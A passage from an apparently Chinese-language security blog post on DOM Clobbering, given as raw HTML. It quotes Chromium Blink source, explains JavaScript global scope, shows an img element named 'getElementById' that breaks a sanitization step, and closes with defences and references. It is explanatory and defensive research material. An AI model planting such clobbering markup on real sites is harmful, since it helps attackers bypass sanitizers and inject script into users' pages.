&#x76F4;&#x63A5;&#x8C03;&#x7528;&#x4E86;<code>window</code>&#x5BF9;&#x8C61;&#x7684;<code>location()</code>&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x5C31;&#x8986;&#x76D6;&#x4E0D;&#x4E86;&#x3002;</p><p>&#x5728;<code>third_party/blink/renderer/core/dom/document.cc</code>&#x4E2D;&#xFF0C;&#x7B2C; 933 &#x884C;&#x4E2D;&#x6709;&#x76F8;&#x5173;&#x5B9A;&#x4E49; <a href="https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/renderer/core/dom/document.cc;l=933?originalUrl=https:%2F%2Fcs.chromium.org%2F" target="_blank" rel="noopener">Document::location()</a></p><p></p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function">Location* <span class="hljs-title">Document::location</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">if</span> (!GetFrame())</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">return</span> domWindow()-&gt;location();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x76F4;&#x63A5;&#x8C03;&#x7528;&#x4E86;<code>domWindow()</code>&#x6765;&#x83B7;&#x53D6;<code>location</code>&#xFF0C;&#x5728;<code>third_party/blink/renderer/core/frame/dom_window.cc</code>&#x4E2D;&#xFF0C;&#x7B2C;85&#x884C;&#x6709;&#x76F8;&#x5173;&#x5B9A;&#x4E49; <a href="https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/renderer/core/frame/dom_window.cc;drc=7e3843b722bda29c236e9cb49111f3296dc2ce20;l=85" target="_blank" rel="noopener">DOMWindow::location()</a></p><p></p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function">Location* <span class="hljs-title">DOMWindow::location</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">if</span> (!location_)</span><br><span class="line">    location_ = MakeGarbageCollected&lt;Location&gt;(<span class="hljs-keyword">const_cast</span>&lt;DOMWindow*&gt;(<span class="hljs-keyword">this</span>));</span><br><span class="line">  <span class="hljs-keyword">return</span> location_.Get();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x53E6;&#x5916;&#xFF0C;&#x6709;&#x4EBA;&#x63D0;&#x8FC7;&#x76F8;&#x5173;&#x7528;&#x5176;&#x4ED6; hook &#x7684;&#x65B9;&#x5F0F; <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=315760" target="_blank" rel="noopener">Issue 315760: document.domain can be hooked</a>&#xFF0C;&#x91CC;&#x9762;&#x63D0;&#x5230;&#x53EF;&#x4EE5; hook &#x5230; domain &#x8DDF; location &#xFF0C;&#x4F46;&#x662F;&#x6211;&#x5728;&#x76EE;&#x524D; stable chrome &#x4E0A;&#x6D4B;&#x8BD5;&#x53EA;&#x80FD; hook &#x5230; domain &#xFF0C;&#x81F3;&#x4E8E; location &#x4E0D;&#x77E5;&#x9053;&#x662F;&#x4E0D;&#x662F;&#x88AB;&#x4FEE;&#x4E86;&#xFF0C;&#x5C3D;&#x7BA1;&#x56DE;&#x590D;&#x7684;&#x662F;&#x201D;Browsers allow hooking these properties. It doesn&#x2019;t matter&#x201D;</p><h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><p>&#x8FD9;&#x91CC;&#x7B80;&#x5355;&#x770B;&#x4E86;&#x4E00;&#x4E0B; Cookie &#x7684;&#x5B9E;&#x73B0;&#xFF0C;&#x4E3B;&#x8981;&#x662F;&#x8FD9;&#x4E24;&#x90E8;&#x5206;&#x4EE3;&#x7801;&#xFF1A;</p><p><a href="https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/renderer/core/dom/document.cc;l=5798" target="_blank" rel="noopener">Document::cookie</a></p><p></p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">String</span> <span class="hljs-title">Document::cookie</span><span class="hljs-params">(ExceptionState&amp; exception_state)</span> <span class="hljs-keyword">const</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">if</span> (GetSettings() &amp;&amp; !GetSettings()-&gt;GetCookieEnabled())</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">String</span>();</span><br><span class="line"></span><br><span class="line">  CountUse(WebFeature::kCookieGet);</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> (!GetSecurityOrigin()-&gt;CanAccessCookies()) {</span><br><span class="line">    <span class="hljs-keyword">if</span> (IsSandboxed(mojom::<span class="hljs-built_in">blink</span>::WebSandboxFlags::kOrigin))</span><br><span class="line">      exception_state.ThrowSecurityError(</span><br><span class="line">          <span class="hljs-string">&quot;The document is sandboxed and lacks the &apos;allow-same-origin&apos; flag.&quot;</span>);</span><br><span class="line">    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Url().ProtocolIs(<span class="hljs-string">&quot;data&quot;</span>))</span><br><span class="line">      exception_state.ThrowSecurityError(</span><br><span class="line">          <span class="hljs-string">&quot;Cookies are disabled inside &apos;data:&apos; URLs.&quot;</span>);</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">      exception_state.ThrowSecurityError(<span class="hljs-string">&quot;Access is denied for this document.&quot;</span>);</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">String</span>();</span><br><span class="line">  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (GetSecurityOrigin()-&gt;IsLocal()) {</span><br><span class="line">    CountUse(WebFeature::kFileAccessedCookies);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> (!cookie_jar_)</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">String</span>();</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">return</span> cookie_jar_-&gt;Cookies();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p><a href="https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/renderer/core/loader/cookie_jar.cc;drc=76ccbe80ceaa4529956a6a3d9d8cc9e9a44b1904;l=27?originalUrl=https:%2F%2Fcs.chromium.org%2F" target="_blank" rel="noopener">CookieJar::Cookies()</a></p><p></p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">String</span> <span class="hljs-title">CookieJar::Cookies</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">  KURL cookie_url = document_-&gt;CookieURL();</span><br><span class="line">  <span class="hljs-keyword">if</span> (cookie_url.IsEmpty())</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">String</span>();</span><br><span class="line"></span><br><span class="line">  RequestRestrictedCookieManagerIfNeeded();</span><br><span class="line">  <span class="hljs-keyword">String</span> value;</span><br><span class="line">  backend_-&gt;GetCookiesString(cookie_url, document_-&gt;SiteForCookies(),</span><br><span class="line">                             document_-&gt;TopFrameOrigin(), &amp;value);</span><br><span class="line">  <span class="hljs-keyword">return</span> value;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4EE5;&#x53CA;&#xFF0C;&#x867D;&#x7136; cookie &#x4E0D;&#x80FD;&#x88AB;&#x5B8C;&#x5168;&#x5B57;&#x7B26;&#x4E32;&#x5316;&#x63A7;&#x5236;&#xFF0C;&#x4F46;&#x662F;&#x53EF;&#x4EE5;&#x88AB; Clobbered &#x7684;&#x95EE;&#x9898;&#x5728;2&#x5E74;&#x524D;&#x4E5F;&#x6709;&#x4EBA;&#x62A5;&#x544A;&#x8FC7;&#x8FD9;&#x4E2A;&#x76F8;&#x5173;&#x7684;&#x95EE;&#x9898; <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1420032" target="_blank" rel="noopener">document.cookie DOM property can be clobbered using DOM node named cookie</a></p><p>&#x53EA;&#x4E0D;&#x8FC7;&#x76EE;&#x524D;&#x7684;&#x4E3B;&#x6D41;&#x6D4F;&#x89C8;&#x5668;&#x90FD;&#x662F;&#x201D;Safari, Chrome and Firefox all behave the same here&#x201D;&#x3002;</p><h3 id="Document-Collection"><a href="#Document-Collection" class="headerlink" title="Document Collection"></a>Document Collection</h3><p>&#x6D89;&#x53CA;&#x5230; Collection &#x7684; Document &#x90E8;&#x5206;&#xFF1A;</p><p><a href="https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/renderer/core/html/document_name_collection.cc;l=24?originalUrl=https:%2F%2Fcs.chromium.org%2F" target="_blank" rel="noopener">DocumentNameCollection::ElementMatches</a></p><p></p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">DocumentNameCollection::ElementMatches</span><span class="hljs-params">(<span class="hljs-keyword">const</span> HTMLElement&amp; element)</span> <span class="hljs-keyword">const</span> </span>{</span><br><span class="line">  <span class="hljs-comment">// Match images, forms, embeds, objects and iframes by name,</span></span><br><span class="line">  <span class="hljs-comment">// object by id, and images by id but only if they have</span></span><br><span class="line">  <span class="hljs-comment">// a name attribute (this very strange rule matches IE)</span></span><br><span class="line">  <span class="hljs-keyword">auto</span>* html_embed_element = DynamicTo&lt;HTMLEmbedElement&gt;(&amp;element);</span><br><span class="line">  <span class="hljs-keyword">if</span> (IsA&lt;HTMLFormElement&gt;(element) || IsA&lt;HTMLIFrameElement&gt;(element) ||</span><br><span class="line">      (html_embed_element &amp;&amp; html_embed_element-&gt;IsExposed()))</span><br><span class="line">    <span class="hljs-keyword">return</span> element.GetNameAttribute() == name_;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">auto</span>* html_image_element = DynamicTo&lt;HTMLObjectElement&gt;(&amp;element);</span><br><span class="line">  <span class="hljs-keyword">if</span> (html_image_element &amp;&amp; html_image_element-&gt;IsExposed())</span><br><span class="line">    <span class="hljs-keyword">return</span> element.GetNameAttribute() == name_ ||</span><br><span class="line">           element.GetIdAttribute() == name_;</span><br><span class="line">  <span class="hljs-keyword">if</span> (IsA&lt;HTMLImageElement&gt;(element)) {</span><br><span class="line">    <span class="hljs-keyword">const</span> AtomicString&amp; name_value = element.GetNameAttribute();</span><br><span class="line">    <span class="hljs-keyword">return</span> name_value == name_ ||</span><br><span class="line">           (element.GetIdAttribute() == name_ &amp;&amp; !name_value.IsEmpty());</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Window-Collection"><a href="#Window-Collection" class="headerlink" title="Window Collection"></a>Window Collection</h3><p>&#x6D89;&#x53CA;&#x5230; Collection &#x7684; Window &#x90E8;&#x5206;&#xFF1A;</p><p><a href="https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/renderer/core/html/window_name_collection.cc;l=22?originalUrl=https:%2F%2Fcs.chromium.org%2F" target="_blank" rel="noopener">WindowNameCollection::ElementMatches</a></p><p></p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">WindowNameCollection::ElementMatches</span><span class="hljs-params">(<span class="hljs-keyword">const</span> Element&amp; element)</span> <span class="hljs-keyword">const</span> </span>{</span><br><span class="line">  <span class="hljs-comment">// Match only images, forms, embeds and objects by name,</span></span><br><span class="line">  <span class="hljs-comment">// but anything by id</span></span><br><span class="line">  <span class="hljs-keyword">if</span> (IsA&lt;HTMLImageElement&gt;(element) || IsA&lt;HTMLFormElement&gt;(element) ||</span><br><span class="line">      IsA&lt;HTMLEmbedElement&gt;(element) || IsA&lt;HTMLObjectElement&gt;(element)) {</span><br><span class="line">    <span class="hljs-keyword">if</span> (element.GetNameAttribute() == name_)</span><br><span class="line">      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> element.GetIdAttribute() == name_;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="Bouns"><a href="#Bouns" class="headerlink" title="Bouns"></a>Bouns</h2><h3 id="Tip-1-Global-Scope"><a href="#Tip-1-Global-Scope" class="headerlink" title="Tip 1 Global Scope"></a>Tip 1 Global Scope</h3><p>&#x7531;&#x4E8E; Dom Clobbering &#x5229;&#x7528;&#x65B9;&#x5F0F;&#x4E4B;&#x4E00;&#x5C31;&#x662F; hook &#x5168;&#x5C40;&#x4F5C;&#x7528;&#x57DF;&#x4E0B;&#x7684;&#x53D8;&#x91CF;&#xFF0C;&#x53C8;&#x7531;&#x4E8E; Javascript &#x662F;&#x4E00;&#x95E8;&#x5341;&#x5206;&#x795E;&#x5947;&#x7684;&#x8BED;&#x8A00;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x5982;&#x4E0B;&#x51E0;&#x70B9;</p><h4 id="&#x663E;&#x5F0F;&#x58F0;&#x660E;"><a href="#&#x663E;&#x5F0F;&#x58F0;&#x660E;" class="headerlink" title="&#x663E;&#x5F0F;&#x58F0;&#x660E;"></a>&#x663E;&#x5F0F;&#x58F0;&#x660E;</h4><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">  <span class="hljs-keyword">var</span> a = <span class="hljs-number">1</span>;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">let</span> b = <span class="hljs-number">2</span>;</span></span><br><span class="line"><span class="hljs-actionscript">  <span class="hljs-keyword">var</span> c = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">()</span> </span>{};</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">window</span>.a);<span class="hljs-comment">//1</span></span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">window</span>.b);<span class="hljs-comment">//undefined</span></span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">window</span>.c);<span class="hljs-comment">//&#x192; () {}</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="&#x9690;&#x5F0F;&#x58F0;&#x660E;"><a href="#&#x9690;&#x5F0F;&#x58F0;&#x660E;" class="headerlink" title="&#x9690;&#x5F0F;&#x58F0;&#x660E;"></a>&#x9690;&#x5F0F;&#x58F0;&#x660E;</h4><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span><span class="hljs-params">(a)</span></span>{</span></span><br><span class="line">    b = a + 1;</span><br><span class="line">  }</span><br><span class="line">  test(1);</span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">window</span>.b);<span class="hljs-comment">//2</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4E0D;&#x5E26;&#x6709;<strong>&#x58F0;&#x660E;&#x5173;&#x952E;&#x5B57;</strong>&#x7684;&#x53D8;&#x91CF;&#xFF0C;Javascript &#x4F1A;&#x81EA;&#x52A8;&#x6302;&#x8F7D;&#x5230;&#x5168;&#x5C40;&#x4F5C;&#x7528;&#x57DF;&#x4E0A;&#x3002;</p><h4 id="let-amp-var"><a href="#let-amp-var" class="headerlink" title="let &amp; var"></a>let &amp; var</h4><p>ES6 &#x4E2D;&#x65B0;&#x589E;&#x4E86;<code>let</code>&#x547D;&#x4EE4;&#xFF0C;&#x7528;&#x6765;&#x58F0;&#x660E;&#x53D8;&#x91CF;&#x3002;&#x5B83;&#x7684;&#x7528;&#x6CD5;&#x7C7B;&#x4F3C;&#x4E8E;<code>var</code>&#xFF0C;&#x4F46;&#x662F;&#x6240;&#x58F0;&#x660E;&#x7684;&#x53D8;&#x91CF;&#xFF0C;&#x53EA;&#x5728;<code>let</code>&#x547D;&#x4EE4;&#x6240;&#x5728;&#x7684;&#x4EE3;&#x7801;&#x5757;&#x5185;&#x6709;&#x6548;&#x3002;&#x8BE6;&#x7EC6;&#x53EF;&#x4EE5;&#x53C2;&#x8003; <a href="https://es6.ruanyifeng.com/#docs/let#&#x57FA;&#x672C;&#x7528;&#x6CD5;" target="_blank" rel="noopener">let &#x57FA;&#x672C;&#x7528;&#x6CD5;</a></p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">{</span><br><span class="line">  <span class="hljs-keyword">let</span> a = <span class="hljs-number">10</span>;</span><br><span class="line">  <span class="hljs-keyword">var</span> b = <span class="hljs-number">1</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">a <span class="hljs-comment">// ReferenceError: a is not defined.</span></span><br><span class="line">b <span class="hljs-comment">// 1</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4E0A;&#x9762;&#x4EE3;&#x7801;&#x5728;&#x4EE3;&#x7801;&#x5757;&#x4E4B;&#x4E2D;&#xFF0C;&#x5206;&#x522B;&#x7528;<code>let</code>&#x548C;<code>var</code>&#x58F0;&#x660E;&#x4E86;&#x4E24;&#x4E2A;&#x53D8;&#x91CF;&#x3002;&#x7136;&#x540E;&#x5728;&#x4EE3;&#x7801;&#x5757;&#x4E4B;&#x5916;&#x8C03;&#x7528;&#x8FD9;&#x4E24;&#x4E2A;&#x53D8;&#x91CF;&#xFF0C;&#x7ED3;&#x679C;<code>let</code>&#x58F0;&#x660E;&#x7684;&#x53D8;&#x91CF;&#x62A5;&#x9519;&#xFF0C;<code>var</code>&#x58F0;&#x660E;&#x7684;&#x53D8;&#x91CF;&#x8FD4;&#x56DE;&#x4E86;&#x6B63;&#x786E;&#x7684;&#x503C;&#x3002;&#x8FD9;&#x8868;&#x660E;&#xFF0C;<code>let</code>&#x58F0;&#x660E;&#x7684;&#x53D8;&#x91CF;&#x53EA;&#x5728;&#x5B83;&#x6240;&#x5728;&#x7684;&#x4EE3;&#x7801;&#x5757;&#x6709;&#x6548;&#x3002;</p><p>&#x800C;&#x4E14;&#x6709;&#x4E9B;&#x5F88;&#x5947;&#x5999;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x6BD4;&#x5982;&#xFF1A;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">let</span> a = b = <span class="hljs-number">6</span>;</span><br><span class="line"><span class="hljs-built_in">window</span>.a;<span class="hljs-comment">//undefined</span></span><br><span class="line"><span class="hljs-built_in">window</span>.b;<span class="hljs-comment">//6</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Tip-2-Overwrite-function"><a href="#Tip-2-Overwrite-function" class="headerlink" title="Tip 2 Overwrite function"></a>Tip 2 Overwrite function</h3><p>&#x867D;&#x7136;&#x53EF;&#x4EE5; Clobber &#x51FD;&#x6570;&#xFF0C;&#x4F46;&#x662F;&#x76EE;&#x524D;&#x6211;&#x6CA1;&#x627E;&#x5230;&#x4EC0;&#x4E48;&#x65B9;&#x6CD5;&#x8BA9;&#x4ED6;&#x6267;&#x884C;&#x6211;&#x4EEC; Clobber &#x7684;&#x7ED3;&#x679C;&#xFF0C;&#x6216;&#x8005;&#x8BF4;&#x76EE;&#x524D;&#x8C8C;&#x4F3C;&#x4E5F;&#x6CA1;&#x6709;&#x529E;&#x6CD5;&#x901A;&#x8FC7;&#x6807;&#x7B7E;&#x6765;&#x5B9A;&#x4E49;&#x4E00;&#x4E2A;&#x51FD;&#x6570;&#xFF0C;&#x6240;&#x4EE5;&#x53EA;&#x80FD;&#x662F;&#x5F15;&#x8D77;&#x4E00;&#x4E2A;&#x62A5;&#x9519;&#xFF0C;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&apos;getElementById&apos;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&apos;getElementById&apos;</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">var</span> a = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&apos;x&apos;</span>);<span class="hljs-comment">//Uncaught TypeError: document.getElementById is not a function</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x867D;&#x7136;&#x53EA;&#x80FD;&#x5F15;&#x8D77;&#x62A5;&#x9519;&#xFF0C;&#x4F46;&#x662F;&#x5728;&#x4E00;&#x5B9A;&#x573A;&#x666F;&#x4E0B;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x6765;&#x7ED5;&#x8FC7;&#x4E00;&#x4E9B;&#x5224;&#x65AD;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&apos;getElementById&apos;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&apos;getElementById&apos;</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">var</span> a = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&apos;x&apos;</span>);<span class="hljs-comment">//Uncaught TypeError: document.getElementById is not a function</span></span></span><br><span class="line"><span class="hljs-actionscript">  <span class="hljs-comment">//We must use sanitize a here.</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">  <span class="hljs-comment">//We have sanitized a. We can trust a now!</span></span></span><br><span class="line"><span class="hljs-actionscript">  <span class="hljs-comment">//Do something with a.</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x7B2C;&#x4E00;&#x4E2A; JS &#x4EE3;&#x7801;&#x5757;&#x867D;&#x7136;&#x5F15;&#x8D77;&#x4E86;&#x62A5;&#x9519;&#xFF0C;&#x4F46;&#x662F;&#x4E0D;&#x4F1A;&#x5F15;&#x8D77; JS &#x5B8C;&#x5168;&#x505C;&#x6B62;&#x6267;&#x884C;&#xFF0C;JS &#x4F1A;&#x8DF3;&#x8FC7;&#x8FD9;&#x4E2A;&#x62A5;&#x9519;&#x7684;&#x4EE3;&#x7801;&#x5757;&#xFF0C;&#x6267;&#x884C;&#x4E0B;&#x4E00;&#x4E2A;&#x4EE3;&#x7801;&#x5757;&#x3002;</p><h3 id="Tip-3-Prototype-Pollution"><a href="#Tip-3-Prototype-Pollution" class="headerlink" title="Tip 3 Prototype Pollution"></a>Tip 3 Prototype Pollution</h3><p>&#x539F;&#x578B;&#x94FE;&#x6C61;&#x67D3;&#x53EF;&#x4EE5;&#x5417;&#xFF1F;</p><p>&#x6211;&#x76EE;&#x524D;&#x5C1D;&#x8BD5;&#x7684;&#x65B9;&#x6CD5;&#x8FD8;&#x6CA1;&#x6210;&#x529F;&#xFF0C;&#x5982;&#x679C;&#x5E08;&#x5085;&#x5C1D;&#x8BD5;&#x6210;&#x529F;&#x4E86;&#x4E00;&#x5B9A;&#x8981;&#x8DDF;&#x6211;&#x5206;&#x4EAB;&#xFF01;</p><h2 id="Defence"><a href="#Defence" class="headerlink" title="Defence"></a>Defence</h2><ol><li>&#x6700;&#x7B80;&#x5355;&#x7684;&#x662F;&#x5224;&#x65AD;&#x6BCF;&#x4E2A;&#x53D8;&#x91CF;&#x9884;&#x671F;&#x7684;&#x7C7B;&#x578B;&#x4EE5;&#x907F;&#x514D;&#x975E;&#x9884;&#x671F;&#x7C7B;&#x578B;&#x7684;&#x7BE1;&#x6539;&#xFF0C;&#x4F8B;&#x5982;&#xFF0C;&#x53EF;&#x4EE5;&#x68C0;&#x67E5; Dom &#x8282;&#x70B9;&#x7684; attribute &#x5C5E;&#x6027;&#x662F;&#x5426;&#x5B9E;&#x9645;&#x4E0A;&#x662F; NamedNodeMap &#x7684;&#x5B9E;&#x4F8B;&#xFF0C;&#x8FD9;&#x6837;&#x53EF;&#x4EE5;&#x786E;&#x4FDD;&#x8BE5;&#x5C5E;&#x6027;&#x662F;&#x4E00;&#x4E2A; attributes &#x5C5E;&#x6027;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x653B;&#x51FB;&#x8005;&#x63D2;&#x5165;&#x7684; HTMLElement&#x3002;</li><li>&#x6BD5;&#x7ADF;&#x8FD9;&#x79CD;&#x653B;&#x51FB;&#x4E3B;&#x8981;&#x51FA;&#x73B0;&#x5728;&#x5168;&#x5C40;&#x53D8;&#x91CF;&#x8FD9;&#x4E00;&#x5757;&#xFF0C;&#x6240;&#x4EE5;&#x4EE3;&#x7801;&#x89C4;&#x8303;&#x5341;&#x5206;&#x91CD;&#x8981;&#xFF01;</li><li>&#x4F7F;&#x7528;&#x7ECF;&#x8FC7;&#x6D4B;&#x8BD5;&#x7684;&#x5E93;&#xFF0C;&#x4F8B;&#x5982; DOMPurify &#x3002;</li></ol><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://www.blackhat.com/docs/us-15/materials/us-15-Nafeez-Dom-Flow-Untangling-The-DOM-For-More-Easy-Juicy-Bugs.pdf" target="_blank" rel="noopener">DOM FLOW UNTANGLING THE DOM FOR EASY BUGS</a></p><p><a href="http://d1iv3.me/2018/04/11/DOM-Clobbering-Attack/" target="_blank" rel="noopener">DOM Clobbering Attack</a></p><p><a href="https://portswigger.net/research/dom-clobbering-strikes-back" target="_blank" rel="noopener">DOM Clobbering strikes back</a></p><p><a 